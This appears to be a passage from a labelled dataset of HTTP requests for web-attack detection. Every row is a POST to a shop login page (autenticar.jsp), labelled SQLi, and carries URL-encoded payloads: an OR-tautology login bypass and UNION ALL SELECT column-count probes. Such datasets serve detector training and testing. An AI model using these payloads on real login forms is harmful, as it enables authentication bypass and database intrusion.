,id,method,path,query,label
2604,12604,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%2C%208580%23%20AND%20%28919%3D919,SQLi
2605,12605,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%2C%207962%23%20AND%20%285301%3D5301,SQLi
2606,12606,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%2C%202440%23%20AND%20%287350%3D7350,SQLi
2607,12607,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%2C%209222%23%20AND%20%281599%3D1599,SQLi
2608,12608,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%2C%208033%23%20AND%20%289523%3D9523,SQLi
2609,12609,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%2C%201182%23%20AND%20%286478%3D6478,SQLi
2610,12610,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%2C%209883%23%20AND%20%28767%3D767,SQLi
2611,12611,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%2C%206873%23%20AND%20%286040%3D6040,SQLi
2612,12612,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%2C%202552%23%20AND%20%281456%3D1456,SQLi
2613,12613,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%2C%201297%23%20AND%20%28%288875%3D8875,SQLi
2614,12614,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%2C%202677%23%20AND%20%28%287077%3D7077,SQLi
2615,12615,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%2C%207300%23%20AND%20%28%28890%3D890,SQLi
2616,12616,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%2C%207173%23%20AND%20%28%281677%3D1677,SQLi
2617,12617,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%2C%201653%23%20AND%20%28%284309%3D4309,SQLi
2618,12618,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%2C%201884%23%20AND%20%28%286384%3D6384,SQLi
2619,12619,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%2C%204794%23%20AND%20%28%282417%3D2417,SQLi
2620,12620,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%2C%203678%23%20AND%20%28%286932%3D6932,SQLi
2621,12621,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%2C%201983%23%20AND%20%28%281200%3D1200,SQLi
2622,12622,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20UNION%20ALL%20SELECT%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%2C%208685%23%20AND%20%28%287782%3D7782,SQLi
2623,12623,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%2C%201467%23%20AND%20%28%28%283028%3D3028,SQLi
2624,12624,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%2C%209881%23%20AND%20%28%28%286204%3D6204,SQLi
2625,12625,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%2C%206811%23%20AND%20%28%28%289899%3D9899,SQLi
2626,12626,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%2C%207203%23%20AND%20%28%28%286430%3D6430,SQLi
2627,12627,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%2C%201562%23%20AND%20%28%28%289461%3D9461,SQLi
2628,12628,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%2C%202470%23%20AND%20%28%28%28206%3D206,SQLi
2629,12629,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%2C%209443%23%20AND%20%28%28%282589%3D2589,SQLi
2630,12630,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%2C%205579%23%20AND%20%28%28%288815%3D8815,SQLi
2631,12631,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%2C%209247%23%20AND%20%28%28%283976%3D3976,SQLi
2632,12632,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20UNION%20ALL%20SELECT%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%2C%207924%23%20AND%20%28%28%28620%3D620,SQLi
2633,12633,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%2C%20806%23,SQLi
2634,12634,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%2C%208906%23,SQLi
2635,12635,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%2C%202461%23,SQLi
2636,12636,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%2C%206325%23,SQLi
2637,12637,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%2C%203867%23,SQLi
2638,12638,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%2C%206001%23,SQLi
2639,12639,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%2C%206121%23,SQLi
2640,12640,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%2C%201197%23,SQLi
2641,12641,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%2C%209118%23,SQLi
2642,12642,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20UNION%20ALL%20SELECT%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%2C%208931%23,SQLi
2643,12643,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%2C%203606%23%20AND%20%28%27Vtqm%27%3D%27Vtqm,SQLi
2644,12644,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%2C%208524%23%20AND%20%28%27eqAF%27%3D%27eqAF,SQLi
2645,12645,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%2C%20228%23%20AND%20%28%27lubF%27%3D%27lubF,SQLi
2646,12646,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20UNION%20ALL%20SELECT%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%2C%207368%23%20AND%20%28%27pMeF%27%3D%27pMeF,SQLi
